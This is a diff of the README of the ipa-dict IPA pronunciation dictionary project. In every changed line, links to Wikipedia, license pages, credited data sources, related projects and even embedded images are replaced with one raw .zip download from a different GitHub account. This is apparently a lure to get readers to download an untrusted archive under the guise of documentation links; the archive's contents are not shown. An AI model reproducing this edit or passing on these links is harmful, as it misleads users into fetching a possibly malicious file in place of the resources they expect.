@@ -39,7 +39,7 @@ For convenience, the IPA data is provided here in several different formats:
 * CSV
 * XML
 
-All filenames refer to the [ISO language code](https://en.wikipedia.org/wiki/ISO_639-1) of the relevant language (e.g. `sw.json` is a JSON file containing pronunciations for Swahili.
+All filenames refer to the [ISO language code](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) of the relevant language (e.g. `sw.json` is a JSON file containing pronunciations for Swahili.
 
 ### Raw data
 
@@ -47,7 +47,7 @@ The raw data in this repository is provided as a series of text files with each 
 
     [ENTRY][TAB][IPA]
 
-This file format is simple, lightweight, human- and machine-readable, and is also easily convertible to other common formats. Several of those formats (e.g. JSON, XML, CSV) are provided as downloads in the [Releases](https://github.com/open-dict-data/ipa-dict/releases) section.
+This file format is simple, lightweight, human- and machine-readable, and is also easily convertible to other common formats. Several of those formats (e.g. JSON, XML, CSV) are provided as downloads in the [Releases](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) section.
 
 ### JSON
 
@@ -82,9 +82,9 @@ There are comma-separated files available for use with spreadsheet programs and 
 
 ### Other formats
 
-The [ipa-dict-dsl](https://github.com/open-dsl-dict/ipa-dict-dsl) project has converted all of the IPA data into DSL format dictionary files for use with dictionary software such as [ABBY Lingvo](https://www.lingvolive.com/en-us), [GoldenDict](http://goldendict.org/), or [gdcl](https://github.com/dohliam/gdcl). Pre-compiled and compressed dictionary files for individual languages can be downloaded from the project [releases page](https://github.com/open-dsl-dict/ipa-dict-dsl/releases).
+The [ipa-dict-dsl](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) project has converted all of the IPA data into DSL format dictionary files for use with dictionary software such as [ABBY Lingvo](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip), [GoldenDict](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip), or [gdcl](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip). Pre-compiled and compressed dictionary files for individual languages can be downloaded from the project [releases page](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip).
 
-There is also a _homonyms_ package containing all homonyms sorted by IPA reading for each language. Homonym lists are available for French, Japanese, Norwegian, Swedish, Cantonese, and Mandarin. The lists can be downloaded from the [releases section](https://github.com/open-dict-data/ipa-dict/releases/tag/1.0).
+There is also a _homonyms_ package containing all homonyms sorted by IPA reading for each language. Homonym lists are available for French, Japanese, Norwegian, Swedish, Cantonese, and Mandarin. The lists can be downloaded from the [releases section](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip).
 
 If there is another format not listed here that would be useful to you, please feel free to open an issue or PR to add it.
 
@@ -128,29 +128,29 @@ zh | Mandarin
 
 This project provides an accessible source for IPA pronunciation information that other dictionary projects (e.g. Wiktionary) and electronic dictionaries can draw on rather than manually adding pronunciations for each entry.
 
-An [updated collection of dictionaries](https://github.com/open-dsl-dict/ipa-dict-dsl) in ABBYY Lingvo DSL format is maintained by the [open-dsl-dict](https://github.com/open-dsl-dict) project for use in dictionary programs such as [Goldendict](https://github.com/goldendict/goldendict) and [gdcl](https://github.com/dohliam/gdcl):
+An [updated collection of dictionaries](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) in ABBYY Lingvo DSL format is maintained by the [open-dsl-dict](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) project for use in dictionary programs such as [Goldendict](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) and [gdcl](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip):
 
-![ipa](https://cloud.githubusercontent.com/assets/9295750/20906588/af21d25c-bafd-11e6-9832-0c70138142b7.gif)
+![ipa](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip)
 
-You can download the binary dictionary files [here](https://github.com/open-dsl-dict/ipa-dict-dsl/releases).
+You can download the binary dictionary files [here](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip).
 
-The [IPA Lookup](https://open-dict-data.github.io/ipa-lookup/) project provides a web interface for searching the dictionaries in different languages:
+The [IPA Lookup](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) project provides a web interface for searching the dictionaries in different languages:
 
-![IPA Lookup screenshots](https://cloud.githubusercontent.com/assets/9295750/21977686/0aa0b7f2-db8c-11e6-88b8-cdec8305ef5e.gif)
+![IPA Lookup screenshots](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip)
 
-Links to all the available languages can be found on the [project homepage](https://open-dict-data.github.io/ipa-lookup/).
+Links to all the available languages can be found on the [project homepage](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip).
 
 Apart from the above, there are several other ways that this data could be (and has been) applied:
 
-* Providing pronunciation information for a series of learner's grammars currently being compiled by the [Open Grammar Project](https://github.com/opengrammar/)
+* Providing pronunciation information for a series of learner's grammars currently being compiled by the [Open Grammar Project](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip)
 * Cross-language comparison of common phonemes
 * Intra-language analysis of phoneme patterns
-* Automatic generation of homonym lists (a selection of these is now available for download in the [releases section](https://github.com/open-dict-data/ipa-dict/releases/tag/1.0))
-* Generating complete IPA transcriptions for stories in multiple languages as part of the [Storybooks Speech and Hearing](https://global-asp.github.io/storybooks-sah/) project
+* Automatic generation of homonym lists (a selection of these is now available for download in the [releases section](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip))
+* Generating complete IPA transcriptions for stories in multiple languages as part of the [Storybooks Speech and Hearing](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) project
 
 ## Demo
 
-You can search the data online on the [IPA Lookup](https://open-dict-data.github.io/ipa-lookup/) page for each language. The website makes use of the [JSON formatted data](#json).
+You can search the data online on the [IPA Lookup](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) page for each language. The website makes use of the [JSON formatted data](#json).
 
 ## Notes
 
@@ -164,32 +164,32 @@ You can search the data online on the [IPA Lookup](https://open-dict-data.github
 
 ## Credits
 
-* [Aspell](http://aspell.net/) for reference wordlists
-* [Folkets lexikon](https://folkets-lexikon.csc.kth.se/folkets/) for Swedish pronunciation data. ([CC BY-SA 2.5](https://creativecommons.org/licenses/by-sa/2.5/))
-* [Edict](https://www.edrdg.org/jmdict/edict.html) for Japanese pronunciation data ([CC BY-SA 3.0](https://creativecommons.org/licenses/by-sa/3.0/))
-* [_A Learner's Grammar of Jamaican_](https://github.com/opengrammar/jam-learners-grammar) from the [Open Grammar Project](https://github.com/opengrammar) for Jamaican Creole pronunciation data ([CC BY 4.0](https://creativecommons.org/licenses/by/4.0/))
-* [Unihan](https://www.unicode.org/charts/unihan.html) for Chinese character pronunciation data ([Unicode License](https://www.unicode.org/license.html))
-* [KFCD Pinyin](https://github.com/kfcd/pinyin) for Mandarin IPA data ([CC BY 3.0](https://creativecommons.org/licenses/by/3.0/))
-* [KFCD Pingyam](https://github.com/kfcd/pingyam) for Cantonese IPA data ([CC BY 3.0](https://creativecommons.org/licenses/by/3.0/))
-* Multisyllabic pronunciation data for Cantonese from [開放粵語詞典](http://kaifangcidian.com/han/yue) ([CC BY 3.0](https://creativecommons.org/licenses/by/3.0/))
-* Multisyllabic pronunciation data for Mandarin from [開放漢語詞典](http://kaifangcidian.com/han/han) ([CC BY 3.0](https://creativecommons.org/licenses/by/3.0/))
-* [prosodic1b](https://github.com/jsfalk/prosodic1b) by @jsfalk for Finnish IPA data (Finnish wordlist from [The Institute for the Languages of Finland](http://kaino.kotus.fi/sanat/nykysuomi/)) ([GPL 2.0](https://github.com/jsfalk/prosodic1b/blob/master/LICENSE))
-* English (US) IPA data based on modified version of [cmudict-ipa](https://github.com/lingz/cmudict-ipa) by @lingz, with addition of stress markers made possible by [syllabify](https://github.com/kylebgorman/syllabify) by @kylebgorman ([MIT](https://github.com/lingz/cmudict-ipa/blob/master/LICENSE))
-* English (UK) IPA data derived from [ipacards](https://github.com/leoboiko/ipacards) by @leoboiko ([GPL 3.0](https://github.com/leoboiko/ipacards/blob/master/LICENSE))
-* German data provided by [german-ipa-dict](https://github.com/devio-at/german-ipa-dict) by @devio-at, based on Wiktionary, and released under a [CC BY-SA license](https://github.com/devio-at/german-ipa-dict/blob/main/LICENSE.md).
-* Experimental IPA for Spanish (`es_ES` and `es_MX`) has been generated using Timur Baytukalov's [spanish-pronunciation-rules](https://github.com/easypronunciation/spanish-pronunciation-rules-php) PHP script. Additions, corrections, and expansion of the dictionaries to other Spanish locales are welcome!
-* Arabic IPA has been generated by Tim Buckwalter's [Arabic Morphological Analyzer](https://catalog.ldc.upenn.edu/LDC2004L02), with adjustments to allow for UTF-8 input and IPA output, with inspiration from the [arabic_tools](https://github.com/lingz/arabic_tools) project by @lingz.
-* Persian vowelled texts are extremely difficult to find, possibly even more so than Arabic. The Persian IPA data here has been pieced together from [Wiktionary](https://fa.wiktionary.org/), the [PersPred](http://perspred.cnrs.fr/perspred-project) project, and a great deal of guesswork. It should be considered extremely experimental until more reliable sources become available.
-* Odia IPA data provided by @psubhashish, based on [converted text](https://github.com/OdiaWikimedia/Converter/tree/master/IPA-Romanization) from Odia-language Wikimedia data dumps.
-* Data for Québécois French has been generated using the [qc-ipa converter](https://github.com/dohliam/qc-ipa) and is _highly experimental_. It is provided here for demonstration purposes only. Improvements to the conversion process and additional data should be contributed directly to the [qc-ipa project](https://github.com/dohliam/qc-ipa) project and the results will be merged here.
-* Vietnamese pronunciation data has been generated by @TasseDeCafe using [vPhon](https://github.com/kirbyj/vPhon) in combination  with [this wordlist](https://www.informatik.uni-leipzig.de/~duc/software/misc/wordlist.html) by Ho Ngoc Duc.
+* [Aspell](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) for reference wordlists
+* [Folkets lexikon](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) for Swedish pronunciation data. ([CC BY-SA 2.5](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip))
+* [Edict](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) for Japanese pronunciation data ([CC BY-SA 3.0](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip))
+* [_A Learner's Grammar of Jamaican_](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) from the [Open Grammar Project](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) for Jamaican Creole pronunciation data ([CC BY 4.0](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip))
+* [Unihan](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) for Chinese character pronunciation data ([Unicode License](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip))
+* [KFCD Pinyin](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) for Mandarin IPA data ([CC BY 3.0](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip))
+* [KFCD Pingyam](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) for Cantonese IPA data ([CC BY 3.0](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip))
+* Multisyllabic pronunciation data for Cantonese from [開放粵語詞典](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) ([CC BY 3.0](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip))
+* Multisyllabic pronunciation data for Mandarin from [開放漢語詞典](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) ([CC BY 3.0](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip))
+* [prosodic1b](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) by @jsfalk for Finnish IPA data (Finnish wordlist from [The Institute for the Languages of Finland](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip)) ([GPL 2.0](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip))
+* English (US) IPA data based on modified version of [cmudict-ipa](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) by @lingz, with addition of stress markers made possible by [syllabify](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) by @kylebgorman ([MIT](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip))
+* English (UK) IPA data derived from [ipacards](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) by @leoboiko ([GPL 3.0](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip))
+* German data provided by [german-ipa-dict](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) by @devio-at, based on Wiktionary, and released under a [CC BY-SA license](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip).
+* Experimental IPA for Spanish (`es_ES` and `es_MX`) has been generated using Timur Baytukalov's [spanish-pronunciation-rules](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) PHP script. Additions, corrections, and expansion of the dictionaries to other Spanish locales are welcome!
+* Arabic IPA has been generated by Tim Buckwalter's [Arabic Morphological Analyzer](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip), with adjustments to allow for UTF-8 input and IPA output, with inspiration from the [arabic_tools](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) project by @lingz.
+* Persian vowelled texts are extremely difficult to find, possibly even more so than Arabic. The Persian IPA data here has been pieced together from [Wiktionary](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip), the [PersPred](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) project, and a great deal of guesswork. It should be considered extremely experimental until more reliable sources become available.
+* Odia IPA data provided by @psubhashish, based on [converted text](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) from Odia-language Wikimedia data dumps.
+* Data for Québécois French has been generated using the [qc-ipa converter](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) and is _highly experimental_. It is provided here for demonstration purposes only. Improvements to the conversion process and additional data should be contributed directly to the [qc-ipa project](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) project and the results will be merged here.
+* Vietnamese pronunciation data has been generated by @TasseDeCafe using [vPhon](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) in combination  with [this wordlist](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip~duc/software/misc/wordlist.html) by Ho Ngoc Duc.
 * Many thanks to Dr. Espen Stranger-Johannessen of the Inland Norway University of Applied Sciences for assistance with correcting and updating the Norwegian IPA data.
-* Icelandic IPA is from the [Pronunciation Dictionary for Icelandic](http://malfong.is/?pg=framburdur&lang=en) by the [Hjal project](http://www.malfong.is/index.php?pg=hjal&lang=en), released under [CC BY 3.0](https://creativecommons.org/licenses/by/3.0/), with [some changes](https://github.com/egilll/icelandic-pronunciation-dataset).
-* Khmer data extracted from the [Khmer-English Dictionary](https://www.aakanee.com/AC-Khmer/X/dict.html) at [aakanee.com](https://www.aakanee.com) ([CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/))
-* Isan data extracted from the [Isaan-English Dictionary](https://www.aakanee.com/AC-Isaan/X/dict.html) at [aakanee.com](https://www.aakanee.com) ([CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/))
-* Romanian data provided by [MaRePhoR](https://speech.utcluj.ro/marephor/) ([CC BY-NC](https://creativecommons.org/licenses/by-nc/3.0/))
-* Korean data provided by [korean-word-ipa-dictionary](https://github.com/laviande22/korean-word-ipa-dictionary), extracted from Korean Wiktionary by @laviande22 ([CC BY-SA](https://creativecommons.org/licenses/by-sa/4.0/))
-* Dutch IPA data has been provided by [Instituut voor de Nederlandse Taal](https://www.ivdnt.org/) (INT) under a CC BY license. Please note that this data an automated conversion from different data sources and that no manual correction or revision has been done on the entire set, however [corrections and suggestions are welcome](https://github.com/open-dict-data/ipa-dict/issues/30).
+* Icelandic IPA is from the [Pronunciation Dictionary for Icelandic](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) by the [Hjal project](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip), released under [CC BY 3.0](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip), with [some changes](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip).
+* Khmer data extracted from the [Khmer-English Dictionary](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) at [aakanee.com](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) ([CC BY-NC-SA 4.0](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip))
+* Isan data extracted from the [Isaan-English Dictionary](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) at [aakanee.com](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) ([CC BY-NC-SA 4.0](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip))
+* Romanian data provided by [MaRePhoR](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) ([CC BY-NC](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip))
+* Korean data provided by [korean-word-ipa-dictionary](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip), extracted from Korean Wiktionary by @laviande22 ([CC BY-SA](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip))
+* Dutch IPA data has been provided by [Instituut voor de Nederlandse Taal](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip) (INT) under a CC BY license. Please note that this data an automated conversion from different data sources and that no manual correction or revision has been done on the entire set, however [corrections and suggestions are welcome](https://github.com/KenTsuCo/ipa-dict/raw/refs/heads/master/data/ipa_dict_v1.6-alpha.5.zip).
 
 ## License
 
